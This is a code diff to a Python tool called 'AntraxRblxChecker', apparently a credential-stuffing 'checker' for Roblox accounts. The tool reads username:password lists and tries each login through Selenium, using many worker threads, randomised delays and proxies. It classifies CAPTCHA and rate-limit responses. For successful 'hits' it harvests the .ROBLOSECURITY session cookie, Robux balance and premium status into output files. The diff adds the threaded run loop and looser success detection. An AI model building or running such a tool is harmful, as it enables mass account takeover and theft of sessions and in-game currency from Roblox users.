@@ -286,6 +286,7 @@ class AntraxRblxChecker:
     
     def load_accounts(self, file_path: str):
         try:
+            loaded_accounts = 0
             with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                 for line in f:
                     line = line.strip()
@@ -298,9 +299,14 @@ class AntraxRblxChecker:
                                     username=username.strip(),
                                     password=password.strip()
                                 ))
+                                loaded_accounts += 1
+            
             self.stats['total'] = len(self.accounts)
-            print(f"[+] {len(self.accounts)} accounts loaded")
+            print(f"\n[+] {loaded_accounts} accounts loaded")
+            if self.accounts:
+                print(f"[*] First account: {self.accounts[0].username}")
             return True
+            
         except Exception as e:
             print(f"[-] Error loading accounts: {e}")
             return False
@@ -412,8 +418,9 @@ class AntraxRblxChecker:
                 account.message = f"Login error: {str(e)[:30]}"
                 return account
             
+            # Wait for response - check for both success and failure
             wait_time = 0
-            max_wait = 25
+            max_wait = 30
             
             while wait_time < max_wait and self.running:
                 time.sleep(1)
@@ -423,16 +430,19 @@ class AntraxRblxChecker:
                     current_url = driver.current_url.lower()
                     print(f"[DEBUG] {account.username} - URL: {current_url} (wait {wait_time}s)")
                     
-                    if any(x in current_url for x in ["/home", "/my/profile", "/users/"]):
-                        print(f"[DEBUG] Login successful for {account.username}")
+                    # Check for successful login - any URL that's not login page
+                    if "login" not in current_url and "signup" not in current_url:
+                        print(f"[DEBUG] Login successful for {account.username} - URL: {current_url}")
                         account.status = "valid"
                         account.message = "Login successful"
                         account.verification_time = time.time() - start_time
                         
+                        # Get cookie and account data
                         try:
                             cookie = self.get_cookie_from_driver(driver)
                             if cookie:
                                 account.cookies = {'.ROBLOSECURITY': cookie}
+                                print(f"[DEBUG] Cookie obtained for {account.username}")
                                 user_id = self.api_lookup.get_user_id(account.username)
                                 if user_id:
                                     account.user_id = str(user_id)
@@ -444,29 +454,91 @@ class AntraxRblxChecker:
                         
                         return account
                     
-                    # Check for error messages
+                    # Check for error messages on the page
                     try:
-                        error_elements = driver.find_elements(By.CSS_SELECTOR, "#login-form-error, .alert-danger, .error-message")
-                        for el in error_elements:
-                            if el.is_displayed():
-                                text = el.text.lower()
-                                if "incorrect" in text or "wrong" in text:
-                                    print(f"[DEBUG] Wrong password for {account.username}")
+                        # Get page text
+                        page_text = driver.find_element(By.TAG_NAME, "body").text.lower()
+                        
+                        # Check for error keywords
+                        error_keywords = [
+                            "incorrect username or password",
+                            "wrong password",
+                            "invalid username",
+                            "incorrect",
+                            "wrong",
+                            "rate limit",
+                            "too many attempts",
+                            "captcha"
+                        ]
+                        
+                        for keyword in error_keywords:
+                            if keyword in page_text:
+                                print(f"[DEBUG] Error detected: '{keyword}' for {account.username}")
+                                if "incorrect" in keyword or "wrong" in keyword or "invalid" in keyword:
                                     account.status = "invalid_password"
                                     account.message = "Wrong password"
                                     return account
-                                if "rate" in text:
-                                    print(f"[DEBUG] Rate limit for {account.username}")
+                                elif "rate" in keyword or "too many" in keyword:
                                     account.status = "rate_limit"
                                     account.message = "Rate limited"
+                                    return account
+                                elif "captcha" in keyword:
+                                    account.status = "captcha"
+                                    account.message = "CAPTCHA detected"
                                     return account
                     except:
                         pass
                     
-                    if "login" in current_url and wait_time > 15:
-                        print(f"[DEBUG] Still on login page after {wait_time}s for {account.username}")
-                        account.status = "timeout"
-                        account.message = f"Stuck on login ({wait_time}s)"
+                    # Check for error elements
+                    try:
+                        error_selectors = [
+                            "#login-form-error",
+                            "#password-error",
+                            ".alert-danger",
+                            ".error-message",
+                            ".login-error-message",
+                            "[data-testid='login-error-message']",
+                            ".form-error"
+                        ]
+                        
+                        for selector in error_selectors:
+                            try:
+                                error_elements = driver.find_elements(By.CSS_SELECTOR, selector)
+                                for el in error_elements:
+                                    if el.is_displayed():
+                                        error_text = el.text.lower()
+                                        print(f"[DEBUG] Error element found: {error_text} for {account.username}")
+                                        if "incorrect" in error_text or "wrong" in error_text:
+                                            account.status = "invalid_password"
+                                            account.message = "Wrong password"
+                                            return account
+                                        elif "rate" in error_text:
+                                            account.status = "rate_limit"
+                                            account.message = "Rate limited"
+                                            return account
+                            except:
+                                pass
+                    except:
+                        pass
+                    
+                    # Check for CAPTCHA
+                    try:
+                        iframes = driver.find_elements(By.TAG_NAME, "iframe")
+                        for iframe in iframes:
+                            src = iframe.get_attribute("src") or ""
+                            if "recaptcha" in src or "captcha" in src:
+                                print(f"[DEBUG] CAPTCHA detected for {account.username}")
+                                account.status = "captcha"
+                                account.message = "CAPTCHA detected"
+                                return account
+                    except:
+                        pass
+                    
+                    # If we're still on login page after 8 seconds, assume wrong password
+                    if "login" in current_url and wait_time > 8:
+                        print(f"[DEBUG] Still on login page after {wait_time}s for {account.username} - assuming wrong password")
+                        account.status = "invalid_password"
+                        account.message = "Wrong password"
                         return account
                     
                 except Exception as e:
@@ -602,7 +674,210 @@ class AntraxRblxChecker:
             print(f"[DEBUG] {line}")
         
         print("[DEBUG] start_verification_simple completed")
-
+    
+    def start_verification(self):
+        """Original multi-threaded verification (for CLI use)"""
+        if not self.accounts:
+            print("[-] No accounts")
+            return
+        
+        self.running = True
+        self.paused = False
+        self.recent_results = []
+        
+        accounts_to_verify = self.accounts[:self.max_accounts_per_test]
+        
+        print("\n" + "=" * 70)
+        print("[*] STARTING VERIFICATION")
+        print(f"[*] Mode: {self.mode.value}")
+        print(f"[*] Workers: {self.max_workers}")
+        print(f"[*] Delay: {self.min_delay}-{self.max_delay}s")
+        print(f"[*] Accounts: {len(accounts_to_verify)}/{len(self.accounts)}")
+        print(f"[*] Proxies: {len(self.proxy_manager.active_proxies) if self.proxy_manager.proxies else 'None'}")
+        print("=" * 70)
+        
+        work_queue = queue.Queue()
+        for account in accounts_to_verify:
+            work_queue.put(account)
+        
+        workers = []
+        results = queue.Queue()
+        
+        for i in range(self.max_workers):
+            w = threading.Thread(
+                target=self.worker_function,
+                args=(i+1, work_queue, results),
+                daemon=True
+            )
+            w.start()
+            workers.append(w)
+            print(f"[*] Worker {i+1} started")
+        
+        self.monitor_progress(results, len(accounts_to_verify))
+        self.driver_manager.cleanup_drivers()
+        self.show_final_statistics()
+    
+    def worker_function(self, worker_id: int, work_queue: queue.Queue, results_queue: queue.Queue):
+        while not work_queue.empty() and self.check_execution():
+            try:
+                account = work_queue.get_nowait()
+                verified_account = self.verify_account(account, worker_id)
+                self.update_statistics(verified_account.status)
+                
+                if self.check_execution():
+                    delay = random.uniform(self.min_delay, self.max_delay)
+                    time.sleep(delay)
+                
+                work_queue.task_done()
+                results_queue.put((worker_id, verified_account))
+                
+            except queue.Empty:
+                break
+            except Exception as e:
+                if self.check_execution():
+                    print(f"[-] Worker {worker_id} error: {e}")
+                work_queue.task_done()
+                results_queue.put((worker_id, Account("ERROR", "", "worker_error", message=str(e))))
+    
+    def check_execution(self):
+        with self.lock:
+            if not self.running:
+                return False
+            while self.paused and self.running:
+                time.sleep(0.5)
+            return self.running
+    
+    def update_statistics(self, status: str):
+        if not self.check_execution():
+            return
+        
+        self.stats['verified'] += 1
+        
+        mapping = {
+            'valid': 'valid',
+            'invalid_password': 'wrong_password',
+            'captcha': 'captcha',
+            'rate_limit': 'rate_limit',
+            'timeout': 'timeout',
+            'blocked': 'blocked',
+            'driver_error': 'driver_error',
+            'error': 'other_errors'
+        }
+        
+        if status in mapping:
+            self.stats[mapping[status]] += 1
+    
+    def monitor_progress(self, results_queue: queue.Queue, total: int):
+        last_update = 0
+        processed_results = []
+        
+        os.system('cls' if os.name == 'nt' else 'clear')
+        
+        try:
+            while self.check_execution():
+                try:
+                    worker_id, account = results_queue.get(timeout=1)
+                    
+                    if account.status == 'valid':
+                        premium_tag = " [PREMIUM]" if account.premium else ""
+                        robux_tag = f" | R${account.robux:,}" if account.robux > 0 else ""
+                        result_line = f"W{worker_id} [HIT] {account.username} | {account.message}{robux_tag}{premium_tag}"
+                    else:
+                        symbols = {
+                            'valid': '[HIT]',
+                            'invalid_password': '[WRONG]',
+                            'captcha': '[CAPTCHA]',
+                            'rate_limit': '[RATE]',
+                            'timeout': '[TIMEOUT]',
+                            'blocked': '[BLOCKED]',
+                            'driver_error': '[DRIVER]',
+                            'error': '[ERROR]',
+                            'cancelled': '[STOPPED]'
+                        }
+                        symbol = symbols.get(account.status, '[?]')
+                        result_line = f"W{worker_id} {symbol} {account.username} | {account.message}"
+                    
+                    processed_results.append(result_line)
+                    
+                    if len(processed_results) > 10:
+                        processed_results.pop(0)
+                    
+                    results_queue.task_done()
+                    
+                except queue.Empty:
+                    pass
+                
+                if time.time() - last_update > 0.5:
+                    os.system('cls' if os.name == 'nt' else 'clear')
+                    
+                    print("=" * 70)
+                    print("   ATX ROBLOX CHECKER")
+                    print("=" * 70)
+                    
+                    elapsed = time.time() - self.stats['start_time']
+                    minutes = elapsed / 60 if elapsed > 0 else 0
+                    speed = self.stats['verified'] / minutes if minutes > 0 else 0
+                    hit_rate = (self.stats['valid'] / self.stats['verified'] * 100) if self.stats['verified'] > 0 else 0
+                    
+                    print("\n[ LIVE STATISTICS ]")
+                    print("-" * 50)
+                    print(f"  Progress:     {self.stats['verified']}/{total} ({hit_rate:.1f}%)")
+                    print(f"  Hits:         {self.stats['valid']}")
+                    print(f"  Premium:      {self.stats['premium_accounts']}")
+                    print(f"  Total Robux:  {self.stats['total_robux']:,}")
+                    print(f"  Wrong Pass:   {self.stats['wrong_password']}")
+                    print(f"  CAPTCHA:      {self.stats['captcha']}")
+                    print(f"  Rate Limit:   {self.stats['rate_limit']}")
+                    print(f"  Timeouts:     {self.stats['timeout']}")
+                    print(f"  Speed:        {speed:.1f}/min")
+                    print("-" * 50)
+                    
+                    print("\n[ RECENT RESPONSES ]")
+                    print("-" * 50)
+                    for line in processed_results[-10:]:
+                        print(f"  {line}")
+                    print("-" * 50)
+                    
+                    last_update = time.time()
+                    
+                    if self.stats['verified'] >= total:
+                        break
+                    
+                    time.sleep(0.1)
+                    
+        except KeyboardInterrupt:
+            print("\n[!] Interrupted")
+    
+    def show_final_statistics(self):
+        if not self.running:
+            print("[!] Verification cancelled")
+            return
+            
+        elapsed = time.time() - self.stats['start_time']
+        minutes = elapsed / 60
+        
+        print("\n" + "=" * 70)
+        print("[ FINAL REPORT ]")
+        print("=" * 70)
+        print(f"Time: {minutes:.1f} min")
+        print(f"Verified: {self.stats['verified']}")
+        
+        if self.stats['valid'] > 0:
+            print(f"\n[+] HITS: {self.stats['valid']}")
+            print(f"[+] Premium Accounts: {self.stats['premium_accounts']}")
+            print(f"[+] Total Robux: {self.stats['total_robux']:,}")
+            print(f"\n[+] Generated files:")
+            print(f"    - valid_result.txt (Complete account info)")
+            print(f"    - cookie_result.txt (Username:Pass|Cookie|Robux|Premium)")
+        
+        if self.stats['verified'] > 0:
+            rate = (self.stats['valid'] / self.stats['verified']) * 100
+            print(f"\nHit rate: {rate:.1f}%")
+            if minutes > 0:
+                speed = self.stats['verified'] / minutes
+                print(f"Speed: {speed:.1f} accounts/min")
+        
+        print("=" * 70)
 
 def show_banner():
     print("=" * 70)
